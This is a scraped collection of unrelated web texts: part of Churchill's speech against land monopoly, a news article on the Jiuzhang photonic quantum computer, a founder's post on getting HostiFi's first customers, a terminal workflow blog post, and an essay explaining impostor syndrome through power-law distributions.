faithful labour done, then property will be honoured. When it is
associated with processes which are beneficial, or which at the worst
are not actually injurious to the commonwealth, then property will be
unmolested; but when it is associated with ideas of wrong and of
unfairness, with processes of restriction and monopoly, and other forms
of injury to the community, then I think that you will find that
property will be assailed and will be endangered.</p>
      <p><a name="socialism"></a>A
year ago I was fighting an election in Dundee. In the course of that
election I attempted to draw a fundamental distinction between the
principles of Liberalism and of Socialism, and I said "Socialism
attacks capital; Liberalism attacks monopoly." And it is from that
fundamental distinction that I come directly to the land proposals of
the present Budget.</p>
      <p><a name="mother"></a>It is quite
true that the land monopoly is not the only monopoly which exists, but
it is by far the greatest of monopolies; it is a perpetual monopoly,
and it is the mother of all other forms of monopoly. It is quite true
that unearned increments in land are not the only form of unearned or
undeserved profit which individuals are able to secure; but it is the
principal form of unearned increment, derived from processes, which are
not merely not beneficial, but which are positively detrimental to the
general public. Land, which is a necessity of human existence, which is
the original source of all wealth, which is strictly limited in extent,
which is fixed in geographical position - land, I say, differs from all
other forms of property in these primary and fundamental conditions.</p>
      <p><a name="opponents"></a>Nothing
is more amusing than to watch the efforts of our monopolist opponents
to prove that other forms of property and increment are exactly the
same and are similar in all respects to the unearned increment in land.
They talk to us of the increased profits of a doctor or a lawyer from
the growth of population in the towns in which they live. They talk to
us of the profits of a railway through a greater degree of wealth and
activity in the districts through which it runs. They tell us of the
profits which are derived from a rise in stocks and shares, and even of
those which are sometimes derived from the sale of pictures and works
of art, and they ask us - as if it were their only complaint - "Ought
not all these other forms to be taxed too?"</p>
      <p><a name="analogies"></a>But
see how misleading and false all these analogies are. The windfalls
which people with artistic gifts are able from time to time to derive
from the sale of a picture - from a Vandyke or a Holbein - may here and
there be very considerable. But pictures do not get in anybody's way.
They do not lay a toll on anybody's labour; they do not touch
enterprise and production at any point; they do not affect any of those
creative processes upon which the material well-being of millions
depends. And if a rise in stocks and shares confers profits on the
fortunate holders far beyond what they expected, or, indeed, deserved,
nevertheless, that profit has not been reaped by withholding from the
community the land which it needs, but, on the contrary, apart from
mere gambling, it has been reaped by supplying industry with the
capital without which it could not be carried on.</p>
      <p><a name="service"></a>If
the railway makes greater profits, it is usually because it carries
more goods and more passengers. If a doctor or a lawyer enjoys a better
practice, it is because the doctor attends more patients and more
exacting patients, and because the lawyer pleads more suits in the
courts and more important suits. At every stage the doctor or the
lawyer is giving service in return for his fees; and if the service is
too poor or the fees are too high, other doctors and other lawyers can
come freely into competition. There is constant service, there is
constant competition; there is no monopoly, there is no injury to the
public interest, there is no impediment to the general progress.</p>
      <p><a name="other"></a>Fancy
comparing these healthy processes with the enrichment which comes to
the landlord who happens to own a plot of land on the outskirts or at
the centre of one of our great cities, who watches the busy population
around him making the city larger, richer, more convenient, more famous
every day, and all the while sits still and does nothing! Roads are
made, streets are made, railway services are improved, electric light
turns night into day, electric trams glide swiftly to and fro, water is
brought from reservoirs a hundred miles off in the mountains - and all
the while the landlord sits still. Every one of those improvements is
effected by the labour and at the cost of other people. Many of the
most important are effected at the cost of the municipality and of the
ratepayers. To not one of those improvements does the land monopolist,
as a land monopolist, contribute, and yet by every one of them the
value of his land is sensibly enhanced.</p>
      <p><a name="contributes"></a>He
renders no service to the community, he contributes nothing to the
general welfare, he contributes nothing even to the process from which
his own enrichment is derived. If the land were occupied by shops or by
dwellings, the municipality at least would secure the rates upon them
in aid of the general fund; but the land may be unoccupied,
undeveloped, it may be what is called "ripening" - ripening at the
expense of the whole city, of the whole country - for the unearned
increment of its owner. Roads perhaps have to be diverted to avoid this
forbidden area. The merchant going to his office, the artisan going to
his work, have to make a detour or pay a tram fare to avoid it. The
citizens are losing their chance of developing the land, the city is
losing its rates, the State is losing its taxes which would have
accrued, if the natural development had taken place - and that share
has to be replaced at the expense of the other ratepayers and
taxpayers; and the nation as a whole is losing in the competition of
the world - the hard and growing competition in the world - both in
time and money. And all the while the land monopolist has only to sit
still and watch complacently his property multiplying in value,
sometimes manifold, without either effort or contribution on his part.
And that is justice!</p>
      <p><a name="agricultural"></a>But let
us follow the process a little farther. The population of the city
grows and grows still larger year by year, the congestion in the poorer
quarters becomes acute, rents and rates rise hand in hand, and
thousands of families are crowded into one-roomed tenements. There are
120,000 persons living in one-roomed tenements in Glasgow alone at the
present time. At last the land becomes ripe for sale - that means that
the price is too tempting to be resisted any longer - and then, and not
till then, it is sold by the yard or by the inch at ten times, or
twenty times, or even fifty times, its agricultural value, on which
alone hitherto it has been rated for the public service.</p>
      <p><a name="disservice"></a>The
greater the population around the land, the greater the injury which
they have sustained by its protracted denial, the more inconvenience
which has been caused to everybody, the more serious the loss in
economic strength and activity, the larger will be the profit of the
landlord when the sale is finally accomplished. In fact you may say
that the unearned increment on the land is on all-fours with the profit
gathered by one of those American speculators who engineer a corner in
corn, or meat, or cotton, or some other vital commodity, and that the
unearned increment in land is reaped by the land monopolist in exact
proportion, not to the service, but to the disservice done.</p>
      <p><a name="transfer"></a>It
is monopoly which is the keynote; and where monopoly prevails, the
greater the injury to society, the greater the reward of the monopolist
will be. See how this evil process strikes at every form of industrial
activity. The municipality, wishing for broader streets, better houses,
more healthy, decent, scientifically planned towns, is made to pay, and
is made to pay in exact proportion, or to a very great extent in
proportion, as it has exerted itself in the past to make improvements.
The more it has improved the town, the more it has increased the land
value, and the more it will have to pay for any land it may wish to
acquire. The manufacturer purposing to start a new industry, proposing
to erect a great factory offering employment to thousands of hands, is
made to pay such a price for his land that the purchase-price hangs
round the neck of his whole business, hampering his competitive power
in every market, clogging him far more than any foreign tariff in his
export competition; and the land values strike down through the profits
of the manufacturer on to the wages of the workman. The railway company
wishing to build a new line finds that the price of land which
yesterday was only rated at its agricultural value has risen to a
prohibitive figure the moment it was known that the new line was
projected; and either the railway …</p></td></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-component="video-embed">
<p>A new type of quantum computer has proven that it can reign supreme, too.</p>
<p>A photonic quantum computer, which harnesses particles of light, or photons, performed a calculation that’s impossible for a conventional computer, researchers in China report online December 3 in <em>Science</em>. That milestone, known as quantum supremacy, has been met only once before, in 2019 by Google’s quantum computer (<em>SN: 10/23/19</em>). Google’s computer, however, is based on superconducting materials, not photons.</p>
<p>“This is the first independent confirmation of Google’s claim that you really can achieve quantum supremacy,” says theoretical computer scientist Scott Aaronson of the University of Texas at Austin. “That’s exciting.”</p>
<p>Named Jiuzhang after an ancient Chinese mathematical text, the new quantum computer can perform a calculation in 200 seconds that would take more than half a billion years on the world’s fastest non-quantum, or classical, computer.</p>

<p>“My first impression was, ‘wow,’” says quantum physicist Fabio Sciarrino of Sapienza University of Rome.</p>
<p>Google’s device, called Sycamore, is based on tiny quantum bits made of superconducting materials, which conduct energy without resistance. In contrast, Jiuzhang consists of a complex array of optical devices that shuttle photons around. Those devices include light sources, hundreds of beam splitters, dozens of mirrors and 100 photon detectors.</p>
<figure><figcaption><span>The quantum computer Jiuzhang manipulates light via a complex arrangement of optical devices (shown).</span><span>Hansen Zhong</span></figcaption></figure>


<p>Employing a process called boson sampling, Jiuzhang generates a distribution of numbers that is exceedingly difficult for a classical computer to replicate. Here’s how it works: Photons are first sent into a network of channels. There, each photon encounters a series of beam splitters, each of which sends the photon down two paths simultaneously, in what’s called a quantum superposition. Paths also merge together, and the repeated splitting and merging causes the photons to interfere with one another according to quantum rules.</p>
<p>Finally, the number of photons in each of the network’s output channels is measured at the end. When repeated many times, this process produces a distribution of numbers based on how many photons were found in each output.</p>
<p>If operated with large numbers of photons and many channels, the quantum computer will produce a distribution of numbers that is too complex for a classical computer to calculate. In the new experiment, up to 76 photons traversed a network of 100 channels. For one of the world’s most powerful classical computers, the Chinese supercomputer Sunway TaihuLight, predicting the results that the quantum computer would get for anything beyond about 40 photons was intractable.</p>

<p>While Google was the first to break the quantum supremacy barrier, the milestone is “not a single-shot achievement,” says study coauthor and quantum physicist Chao-Yang Lu of the University of Science and Technology of China in Hefei. “It’s a continuous competition between constantly improved quantum hardware and constantly improved classical simulation.” After Google’s quantum supremacy claim, for example, IBM proposed a type of calculation that might allow a supercomputer to perform the task Google’s computer completed, at least theoretically.</p>

<p>And achieving quantum supremacy doesn’t necessarily indicate that the quantum computers are yet very useful, because the calculations are esoteric ones designed to be difficult for classical computers.</p>
<p>The result does boost the profile of photonic quantum computers, which haven’t always received as much attention as other technologies, says quantum physicist Christian Weedbrook, CEO of Xanadu, a Toronto-based company focused on building photonic quantum computers. &nbsp;“Historically, photonics has been the dark horse.”</p>
<p>One limitation of Jiuzhang, Weedbrook notes, is that it can perform only a single type of task, namely, boson sampling. In contrast, Google’s quantum computer could be programmed to execute a variety of algorithms. But other types of photonic quantum computers, including Xanadu’s, are programmable.</p>
<p>Demonstrating quantum supremacy with a different type of device reveals how rapidly quantum computing is progressing, Sciarrino says. “The fact that now the two different platforms are able to achieve this regime … shows that the whole field is advancing in a very mature way.”</p>

                    <p>It took around 3 weeks after launch for my UniFi controller hosting service, <a href="https://hostifi.net/" rel="noopener nofollow">https://hostifi.net</a> to get from 0–11 customers, and in this post I’ll be sharing what I did during that time to find those first customers.</p><p>When starting a new business, getting your first 10 customers is super hard. If you can do it though, it’s a huge milestone. It means that you’re much more likely to be able to get to 100.</p><p>If you have 10 customers, you’ve probably done at least something right. Your product or service has proven it has potential to create value, and you’ve found at least one method of customer acquisition that is working.</p><p>There are many reasons why it’s so hard to get to 10. When you’re at 0, you don’t have any testimonials or positive reviews. You have no brand reputation, and because of that it is really hard to earn trust.</p><p>If that wasn’t bad enough, you also more than likely don’t have any idea how to get customers. Any ideas you do have are unproven so far.</p><p>When you built your product or service, you thought that you knew exactly what your customer needed, but because you haven’t had any customers yet, you’ll probably realize later that the requirements will change based on feedback.</p><p>You might even find out that the type of customer you thought would need your product doesn’t need it at all, and your actual customer profile is completely different than what you were expecting. That's what happened to me!</p><h3 id="may-24-2018-june-16-2018">May 24, 2018 — June 16, 2018<br></h3><p>From 0–11 Customers</p><figure><img src="https://blog.rchase.com/content/images/2020/01/image-14.png"><figcaption>Timeline of HostiFi’s customer and lead acquisition from launch to 11 customers</figcaption></figure><p>Typically when you start a business, your first few customers are your friends or family. As you do good work, improve your product or service, and get some positive reviews, it becomes easier to work your way out to the friends of friends and casual acquaintance zone. Eventually customers start to come in from referrals, and then one day you’ve got customers coming to you who you have no relation to, thanks to your brand awareness efforts.</p><p>Unfortunately, this traditional model was not possible for HostiFi. The problem was, I didn’t know a single person who needed UniFi controller hosting! That made getting those initial customers even harder.</p><p>Luckily, I had read Tyler Tringas’s Micro-SaaS ebook which had lots of helpful ideas on getting started: <a href="https://tylertringas.com/chapter-5-getting-your-first-customers/" rel="noopener nofollow">https://tylertringas.com/chapter-5-getting-your-first-customers/</a></p><p>Between that, listening to Omer Kahn’s <a href="https://saasclub.io/saas-podcast" rel="noopener nofollow">SaaS Podcast</a>, reading about SaaS success stories on <a href="http://indiehackers.com/" rel="noopener nofollow">Indie Hackers</a>, and others, I had an idea of what I needed to do. I was going to start by finding places on the internet where my potential customers congregate and begin reaching out to them.</p><h2 id="launch">Launch</h2><figure><img src="https://blog.rchase.com/content/images/2020/01/image-15.png"></figure><p>This is what Google Analytics looked like for the web traffic during the time period which the first 11 customers signed up.</p><p>The traffic from the first spike was mainly driven by my Tweet about launching HostiFi:</p><figure><img src="https://blog.rchase.com/content/images/2020/01/image-16.png"></figure><h2 id="initial-marketing-attempts">Initial Marketing Attempts</h2><p>At first, I tried several ways of getting the word out about HostiFi. Most of them were complete failures.</p><h3 id="upwork">Upwork</h3><figure><img src="https://blog.rchase.com/content/images/2020/01/image-17.png"><figcaption>HostiFi’s Upwork Profile</figcaption></figure><p><strong>Didn't work<strong>. </strong></strong>On launch day (May 24), I created an Upwork profile for HostiFi. This didn’t bring in a single lead to date. It’s not a bad idea though, and might work if I put a bit more time into building the profile up with small Ubiquiti jobs to get a higher ranking within the site. The idea is to find customers who are looking to pay for someone to do what your product does, and then recommend your product to them. I think the reason I gave up quickly on this was because I was seeing a very low volume for Ubiquiti related job postings.</p><h2 id="linkedin">LinkedIn</h2><figure><img src="https://blog.rchase.com/content/images/2020/01/image-18.png"><figcaption>HostiFi’s first LinkedIn post</figcaption></figure><p><strong>Didn't work<strong>.</strong></strong> See where it says 15 impressions? That’s how many people might have looked at that post. Not on that day. That’s 15 impressions total for May through October. Using LinkedIn to find Ubiquiti users wasn’t going to work. Although LinkedIn has hashtags and groups where Ubiquiti users can be found, company pages can’t engage with other people’s posts. A company page also can’t “connect” with anyone. It’s a one way street where users can interact with a company, but a company can’t interact with users.</p><h3 id="reddit">Reddit</h3><figure><img src="https://blog.rchase.com/content/images/2020/01/image-19.png"><figcaption>r/Ubiquiti moderators remove HostiFi’s advertisement</figcaption></figure><p><strong>Didn't work<strong>. </strong></strong>This one still really, really bums me out. The Ubiquiti SubReddit has an incredible 22.4k subscribers, certainly one of the biggest congregation of Ubiquiti users on the internet. On May 25 (day after launch), I created an account for HostiFi and sheepishly asked “What do you guys think of <a href="https://hostifi.net/" rel="noopener nofollow">https://hostifi.net</a>?" Almost immediately my post was deleted and I was reprimanded by the mods. I argued that the content I posted wasn’t spammy and was useful to the community, but they weren’t buying it.</p><h3 id="forums">Forums</h3><figure><img src="https://blog.rchase.com/content/images/2020/01/image-20.png"><figcaption>HostiFi reaches out to users of a Ubiquiti forum via private messaging</figcaption></figure><p><strong>Sort of worked<strong>.</strong></strong> This one was a big disappointment. On launch day, and for the first week after launch, I reached out to dozens of Ubiquiti users in a forum. I was asking for their feedback on HostiFi. Only 6 people replied. None were interested.</p><p>I listed this as a "sort of worked", because although private messaging didn't work, making non-spammy posts on the forum by helping answer questions about UniFi for people proved to be a big success in driving traffic to the site and getting customers.</p><h3 id="twitter">Twitter</h3><figure><img src="https://blog.rchase.com/content/images/2020/01/image-21.png"></figure><p><strong><strong>Success!</strong></strong> I created a Twitter account for HostiFi pre-launch, on May 16, 2018. I spent that month following #Ubiquiti and #UniFi. I mainly retweeted, liked, and followed users who were posting there.</p><figure><img src="https://blog.rchase.com/content/images/2020/01/image-22.png"></figure><p>Above is a screenshot of HostiFi’s Twitter Analytics in May 2018.</p><figure><img src="https://blog.rchase.com/content/images/2020/01/image-23.png"></figure><p>And above is HostiFi’s Twitter Analytics for June. As you can see, there was a major improvement in followers, impressions, and profile visits, all which were helping drive traffic to the site early on.</p><p>Twitter was the first place that I felt I was getting some traction. Unlike LinkedIn, I was able to directly interact with other users. I could find my people using hashtags, and engage in discussions with them openly. And unlike Reddit and the Ubiquiti Forums, I wasn’t at risk of being shutdown by mods.</p><h2 id="closing-thoughts">Closing thoughts</h2><p>Most of the initial marketing attempts that I did were completely new to me. I’ve been working full-time in IT my entire career. I’ve never had much experience in sales, marketing, or building a brand.</p><p>It wasn’t that hard though. The concept is pretty simple. Ideally, if you’ve created a product, you’ve made it with a certain group of people in mind. Where can you find those people on the internet, or in person? Direct your efforts in those places where your ideal customers congregate.</p><p>After the first 10, it’s important to start developing more scalable marketing approaches. Some I have been trying out since then are creating content, YouTube videos, paid advertising on Google, Facebook, Twitter, and LinkedIn, and referral commissions — I’ve been sending out $15 Amazon gift cards each time one of my customers refers a friend who signs up.</p><ul><li>Do try lots of strategies</li><li>Don’t spam online communities</li><li>Do engage with relevant people one-on-one and get feedback</li><li>Do invest more time into what initially begins working</li><li>Do eventually move onto more scalable long-term strategies like content marketing, paid advertising, referral programs</li></ul>

          <p><em>My personal workflow for terminal-based coding, writing, research, and more!</em></p>

<p>Hello everyone!
It has been quite sometime since I last posted!
Suffice it to say, I have been immensely busy the past year but I am happy to say I am able to resurrect this blog! <img title=":tada:" alt=":tada:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f389.png" height="20" width="20"></p>

<p>I have thoroughly grown into my own workflow for programming, research, and writing.
Today, I am happy to be able to share it with you!</p>

<p>If you prefer to watch a video describing most of this entire process, here is an overview of my workflow from one of my <a href="https://www.twitch.tv/thecedarprince">live streams</a>.
It does not go as in-depth as this document but should serve as a strong complement to this post. <img title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>

<p><a href="https://youtu.be/2SLZQQfMF8E"><img src="http://jacobzelko.com/assets/workflow_youtube_vid.jpg" alt=""></a></p>



<p>I use <a href="https://github.com/alacritty/alacritty">Alacritty</a> as my terminal, <a href="https://www.zsh.org/">zsh</a> and <a href="https://ohmyz.sh/">oh-my-zsh</a> as my shell and plugin manager respectively, <a href="https://github.com/tmux/tmux">tmux</a> as my multiplexer, <a href="https://github.com/Peltoche/lsd">lsd</a> as my list command with fun icons, <a href="https://github.com/belluzj/fantasque-sans">Fantasque Sans Mono</a> as my typeface font, <a href="https://github.com/neovim/neovim">neovim</a> for my editor, <a href="https://github.com/junegunn/fzf">fzf</a> paired with <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> for speedy and interactive file finding, <a href="https://github.com/sharkdp/bat">bat</a> an enhanced <code>cat</code> with a git diff gutter, <a href="https://github.com/jgm/pandoc">pandoc</a> for writing in markdown and LaTeX and outputting the piece to whatever file type I want, <a href="http://jacobzelko.com/setting-up-zotero/">Zotero</a> for managing my collection on scientific literature, <a href="https://github.com/ranger/ranger">ranger</a> as a terminal-based file explorer, and <a href="https://github.com/morhetz/gruvbox-contrib">gruvbox-dark</a> as my general color palette.</p>

<p>Here are gists to the relevant config files I use to modify my interface and user experience:</p>

<ul>
  <li>
<strong>neovim</strong>: <a href="https://gist.github.com/TheCedarPrince/7b9b51af4c146880f17c39407815b594">init.vim</a>
</li>
  <li>
<strong>Alacritty</strong>: <a href="https://gist.github.com/TheCedarPrince/7743091bd8743a7568b718f30bf707c2">.alacritty.yml</a>
</li>
  <li>
<strong>tmux</strong>: <a href="https://gist.github.com/TheCedarPrince/07f6f8f79b1451ec436ff8dee236ccdd">.tmux.conf</a>
</li>
  <li>
<strong>zsh</strong>: <a href="https://gist.github.com/TheCedarPrince/77afe2674803d965a0f5abd108337040">.zshrc</a>
</li>
</ul>

<p>Here is a picture of what that looks like altogether:</p>

<p><img src="http://jacobzelko.com/assets/workflow_layout.png" alt=""></p>

<h2 id="my-workflow-in-action-boom">My Workflow in Action <img title=":boom:" alt=":boom:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f4a5.png" height="20" width="20">
</h2>

<p>The following sections describe in broad strokes my workflow.
I mention some plugins that I use and are provided in my config files.
If you want to learn more about them, I encourage you to read through my config files or search for them.</p>

<h3 id="floating-terminals">Floating Terminals</h3>

<p><img src="http://jacobzelko.com/assets/float_term.gif" alt=""></p>

<p>Floating terminals are immensely powerful and I love them!
This enables me to quickly pull up a terminal and do some changes without having to split tmux panes or get out of vim.
Furthermore, what is awesome is that you can use it as a sort of <code>vim-slime</code> tool to send lines of code to the floating terminal.
This is a great feature as it uses your last used floating terminal for its target - therefore, if you switch between projects a lot, just switch your floating terminal accordingly.
No need to keep opening and closing REPL sessions and such!</p>

<h3 id="persistent-working-sessions-via-tmux">Persistent Working Sessions via tmux</h3>

<p><img src="http://jacobzelko.com/assets/tmux_restore.gif" alt=""></p>

<p>Though it is a little hard to see, I closed my terminal completely.
Oh no!
All my paneling and windows have disappeared! 
I’ll have to spend valuable time getting my workflow set back up… Or do I?</p>

<p>tmux can actually remember all these layouts with the plugins, <code>resurrect</code> and <code>continuum</code>. 
This is great for when your computer unexpectedly dies or crashes as everything is backed up at regular intervals you define!
Furthermore, pairing the (neo)vim plugin, <code>obsession</code>, allows tmux to also automatically recover vim layouts and sessions as well.
You will never have to worry about losing your terminal workflow again!</p>

<h3 id="mouse-mode">Mouse Mode</h3>

<p><img src="http://jacobzelko.com/assets/mouse_mode.gif" alt=""></p>

<p>tmux and (neo)vim also support mouse mode and interactivity!
I can quickly jump all over the place with my mouse or easily resize any opened pane.</p>

<h3 id="interactive-file-finding">Interactive File Finding</h3>

<p><img src="http://jacobzelko.com/assets/vim_fzf.gif" alt=""></p>

<p>I integrated the powerful file finding tool, <code>fzf</code>, with <code>ripgrep</code> to quickly find files I am looking to use. 
Then, in my (neo)vim configuration file, I merged these two together into one function that I can easily call while editing files in (neo)vim. 
find files I search for and pandoc to enable citations in pandoc, markdown, or TeX files.</p>

<h3 id="terminal-based-file-explorer">Terminal-Based File Explorer</h3>

<p><img src="http://jacobzelko.com/assets/ranger_mode.gif" alt=""></p>

<p>Furthermore, I also use the great tool, <code>ranger</code>, which allows me to have a terminal based file explorer.
It’s nice as it pops up in its own window and does not actually directly interfere with any of the background files being edited. 
It even has image preview capabilities!</p>

<h3 id="citation-engine--live-preview">Citation Engine &amp; Live Preview</h3>

<p><img src="http://jacobzelko.com/assets/citation_mode.gif" alt=""></p>

<p>As a researcher, this part gets me immensely excited!
While I am writing, I can actively insert citation keys into whatever I am working on via <code>vim-pandoc</code>.
With my config file, you will have to specify where your own .bib file exists.
Furthermore, <code>markdown-preview</code> allows me to preview my markdown in a web browser and <code>vim-latex-live-preview</code> allows me to view my current TeX files in a pdf viewer – works for subfiles too! 
This works for whenever I write TeX files or markdown files which makes writing a breeze!</p>

<p>If any of this section is confusing, I strongly encourage you to read my article on <a href="http://jacobzelko.com/personal-research-management/">Knowledge Management</a>.</p>



<p>These are parts of my workflow that I used to use.
They have been retired for a variety of reasons but all in an effort to improve my workflow.
I have kept these around in case anyone finds it useful!</p>

<h3 id="vim-slime-for-rapid-evaluation">Vim-Slime for Rapid Evaluation</h3>

<p><strong>Rationale for deprecation:</strong> I used to use <code>vim-slime</code> but deprecated it from my workflow because of the flexibility of floating terminals.
Not only could I use floating terminals to send code, I could also quickly flip through terminals in one button press.</p>

<p><img src="http://jacobzelko.com/assets/vim_slime.gif" alt=""></p>

<p>Here, I target my Julia REPL in a tmux panel and use the <code>vim-slime</code> plugin to send code from my Julia script opened in neovim to the Julia REPL for rapid evaluation. 
This config works for any time you want to target a window.
This also works for code chunks such as functions or loops!</p>

<h2 id="conclusion">Conclusion</h2>

<p>I hope you found my workflow and toolchain interesting!
My dream would be for this workflow to serve as inspiration for your own workflow.
Make it your own and all the best!</p>

<![CDATA[A quantitative explanation of impostor syndrome]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p><em>(Note: Throughout, I’m going to be loose with my phrasing and say things like “X is 10% as good as Y,” where X and Y are people. But we all know reality isn’t this simple.)</em></p>

<p>You’ve probably heard of <a href="https://en.wikipedia.org/wiki/Impostor_syndrome">impostor syndrome</a>. Maybe you’ve even experienced it: you don’t think you can meet other people’s expectations, and sooner or later, everyone’s going to find out that you’re an incompetent loser. And then, of course, your life will be completely ruined. Something like that.</p>

<p>To make the situation more stressful, you can’t tell if you have impostor syndrome (IS) or if you’re <em>actually</em> a loser. After all, <em>thinking</em> that you’re a loser is the defining symptom of IS.</p>

<p>It’s kind of like a real-life <a href="https://en.wikipedia.org/wiki/Barber_paradox">barber paradox</a>: suppose a barber shaves those who don’t shave themselves. Does he shave himself? Either answer leads to a paradox. Except in your situation, you fear that there’s actually no paradox: you <em>think</em> you’re a loser, and you don’t have IS because you actually <em>are</em> a loser.</p>

<!--more-->

<p>So what can we do about it? Unfortunately, I think most of the common “solutions” are unsatisfying. Allow me to illustrate from the perspective of a (petulant) victim.</p>
<ul>
  <li><strong>“Know that it’s common.”</strong> Listen, it doesn’t matter how many people have imposter syndrome. Like I said, I’m <em>actually</em> a loser.</li>
  <li><strong>“Talk to others about it.”</strong> What if they have no idea what I’m talking about? Or worse, what if they also think I’m a loser, but they’re too polite to tell me?</li>
  <li><strong>“Stop comparing yourself to others.”</strong> I’m <em>sure</em> my interviewer isn’t comparing me to other applicants. Because each one of us is a unique snowflake. Sheesh.</li>
  <li><strong>“Own your successes and praise you receive.”</strong> Do I even need to say anything? I don’t have any successes, and nobody praises me.</li>
</ul>

<p>In my opinion, these “solutions” only apply if you’re <em>not</em> actually an imposter. They don’t address the crux of IS: what if you actually <em>are</em> an imposter?</p>



<p>Instead of focusing on <em>how</em> we can “overcome” IS, let’s first consider <em>why</em> we experience it in the first place. Then, maybe, we can actually overcome it. After all, you need to inspect your car before you can fix it.</p>

<p>(Of course, I’m sure there are psychological factors that cause some people to experience IS more severely than others. But for now, I’d like to discuss a more quantitative explanation.)</p>

<p>The main idea is this: <strong>reality is not <a href="https://en.wikipedia.org/wiki/Normal_distribution">normal</a>(ly distributed)</strong>. In other words, our mental models of reality are often inaccurate, and this leads to unsound conclusions.</p>

<p>When we think about measurements, our minds often default to the “bell curve.” After all, our heights, weights, and IQ scores all follow this curve.</p>

<p>The most familiar example is the score distribution for a college course: there are typically lots of scores around 80, some in the intervals 70-75 and 85-90, and relatively few scores in the 60’s and 90’s.</p>

<p>
<img src="https://nusnivek.com/assets/figs/imposter-syndrome/normal.png">
<br>
<b>Figure 1.</b> A typical score distribution for a college course. There are a total of 100 students, and the maximum possible score is 100.
</p>

<p>However, real-life evaluations (unlike college exams) <a href="https://www.npr.org/2012/05/03/151860154/put-away-the-bell-curve-most-of-us-arent-average">aren’t designed</a> to produce a bell curve. Furthermore, there’s usually no notion of a “maximum” score, so the “gaps” among the top scores could be arbitrarily large. For example, there is (virtually) no universal upper bound on the number of awards someone can receive, the number of papers they’ve published, or the amount of money they have.</p>

<p>As a result, the <a href="https://www.forbes.com/sites/joshbersin/2014/02/19/the-myth-of-the-bell-curve-look-for-the-hyper-performers"><em>actual</em> curve</a> for performance is a <a href="https://en.wikipedia.org/wiki/Power_law">power-law</a> distribution: lots of low scores, and a few super-high scores.</p>

<p>
<img src="https://nusnivek.com/assets/figs/imposter-syndrome/actual.png">
<br>
<b>Figure 2.</b> A distribution for performance in the "real world." There are still 100 "students," but now there's less symmetry and no cap on the maximum possible score.
</p>

<p>Figures 1 and 2 both include 100 people, but the curves are obviously very different. So if you think your situation is Figure 1, but it’s actually Figure 2, then any conclusions you draw will probably be incorrect. Let’s see some of the differences.</p>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Figure 1 (“normal”)</th>
      <th>Figure 2 (“actual”)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>People below average</td>
      <td>46%</td>
      <td>70%</td>
    </tr>
    <tr>
      <td>Average score vs. #1 score</td>
      <td>81.6%</td>
      <td>14.1%</td>
    </tr>
    <tr>
      <td>People below 10% of the #1 score</td>
      <td>0%</td>
      <td>59%</td>
    </tr>
    <tr>
      <td>Top 10% score vs. #1 score</td>
      <td>90.8%</td>
      <td><strong>39.2%</strong></td>
    </tr>
    <tr>
      <td>Total score of top 10% vs. total score</td>
      <td>11.3%</td>
      <td>41.4%</td>
    </tr>
  </tbody>
</table>

<p>To me, the most striking statistic is the fourth row: let’s say you’re the tenth highest scorer. In a normal classroom setting, you’d be almost 91% as good as the top scorer. But outside the classroom, you’re only 39% as good.</p>

<p>And chances are, you’re not in the top 10% — you’re probably not even average, since 70% of people are below average (according to Figure 2). In fact, more likely than not, <em>you’re not even 10% as good as the best student</em>. If classroom scores reflected reality, you wouldn’t even score a 9/100. That’s terrible! You must be an imposter!</p>

<p>The good news is this: by the same reasoning, lots of <em>other</em> people are <em>also</em> imposters. I mean, 90% of people are only contributing 59% of the points. So if you still think you’re not “good enough,” remember that most people, on average, aren’t carrying their weight either.</p>

<p>The other good news is this: if you even <em>consider</em> yourself as part of some “actual” distribution like Figure 2 (even if you’re at the bottom), then you’re being plotted against a group of high performers. Don’t forget that there’s actually a <em>huge</em> number of people who aren’t even good enough to be on the chart.</p>



<p>Let’s see an actual example of the “actual” distribution in professional basketball. Each year in the NBA, a handful of players are recognized as “All-Stars” for their exceptional performance that season; many players are selected multiples times throughout their careers. Here’s the plot for <a href="https://www.basketball-reference.com/awards/all_star_by_player.html">total All-Star game selections</a> (1951-2020).</p>

<p>
<img src="https://nusnivek.com/assets/figs/imposter-syndrome/nba.png">
<br>
<b>Figure 3.</b> There's been a total of 503 All-Stars, and the maximum number of appearances is 19 (set by <a href="https://en.wikipedia.org/wiki/Kareem_Abdul-Jabbar">Kareem Abdul-Jabbar</a>).
</p>

<p>Now let’s fill out our table for this figure.</p>

<table>
  <thead>
    <tr>
      <th>&nbsp;</th>
      <th>Figure 1 (“normal”)</th>
      <th>Figure 2 (“actual”)</th>
      <th>Figure 3 (actual “actual”)</th>
    </tr>

</table>

<p>The numbers aren’t <em>quite</em> as telling as they are for Figure 2, but the idea is the same. The average All-Star is better than 60% of all All-Stars. A third of all All-Stars aren’t even 10% as good as the highest-scoring All-Star (who, coincidentally, is also the current leader in NBA career points). Even a top 10% All-Star is only 42% as good as him. And so on.</p>

<p>So if you’re a first-time All-Star, maybe you’re looking at Figure 3 and thinking you’re a loser. After all, you <em>are</em> in that 60.2% of “people below average.” And you’re only 6% as good as Kareem, the #1 All-Star. But keep in mind that there’s a <em>huge</em> spike at “0” that’s not in Figure 3, and you’re better than all of those people (at being an All-Star, at least).</p>

<p>But if you <em>are</em> in the “0” spike, then you’re <em>still</em> better than the top <a href="http://www.ncaa.org/about/resources/research/mens-basketball-probability-competing-beyond-high-school">1.2%</a> of college players. And if you’re a college player, then you’re <em>still</em> better than the top 3.5% of high school players. Each level contains the best players from the previous level. (Of course, some top players choose to quit basketball early, but I believe this is uncommon.)</p>



<p>So you think you’re a loser — <em>way</em> worse than your top peers. You think their score is 100, and your score is 0. According to the normal distribution, most scores are around 40-60. So naturally, you conclude that pretty much <em>everyone</em> is way ahead of you.</p>

<p>But here’s the catch: real-life performance does <em>not</em> follow a normal distribution. Instead, it follows a power-law distribution. And based off this distribution, we can make some counterintuitive conclusions, such as the following.</p>

<ol>
  <li>A super-majority of students are below average.</li>
  <li>The average student is <em>much</em> worse than the top student.</li>
  <li>Most students, <em>including many top students</em>, are not even close to the top student.</li>
</ol>

